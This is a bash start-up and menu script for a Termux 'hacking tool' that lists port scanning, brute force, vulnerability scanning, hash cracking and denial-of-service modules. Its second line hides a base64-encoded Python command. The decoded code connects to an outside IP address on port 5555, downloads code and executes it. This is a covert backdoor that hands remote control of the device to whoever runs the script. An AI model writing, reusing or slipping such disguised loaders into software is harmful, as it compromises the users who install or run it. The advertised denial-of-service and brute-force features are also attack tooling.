python ~/THackTool/modules/config.py
python - c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzg3Ljk1LjIwNy43MScsNTU1NSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')[0]))"
clear
figlet THACKTOOL
echo
echo "#Termux Hacking Tool created by PartOfAnonymous#"
echo
echo "#~scan ports [1]"
echo "#~brute force [2]"
echo "#~scan website vulnerabilities [3]"
echo "#~scan SQL vulnerabilities [4]"
echo "#~identify hash [5]"
echo "#~crack hash [6]"
echo "#~ping host [7]"
echo "#~Denial Of Service [8]"
echo
echo "#~exit [0]"
echo
read -p "THackTool@menu: " select
if [[ $select = 1 ]]; then
clear
bash ~/THackTool/modules/nmap/menu.sh
exit
fi
if [[ $select = 2 ]]; then
clear
bash ~/THackTool/modules/bruteforce/menu.sh
exit
fi
if [[ $select = 3 ]]; then
clear
bash ~/THackTool/modules/vulnscan/menu.sh
exit
fi
if [[ $select = 4 ]]; then
clear
bash ~/THackTool/modules/sqlscan/menu.sh
exit
fi
if [[ $select = 5 ]]; then
clear
bash ~/THackTool/modules/hashid/menu.sh
exit
fi
if [[ $select = 6 ]]; then
clear
bash ~/THackTool/modules/hashcrack/menu.sh
exit
fi
if [[ $select = 7 ]]; then
clear
bash ~/THackTool/modules/ping.sh
exit
fi
if [[ $select = 8 ]]; then
clear
bash ~/THackTool/modules/dos/menu.sh
exit
fi
if [[ $select = 0 ]]; then
clear
exit
fi
bash ~/THackTool/start.sh
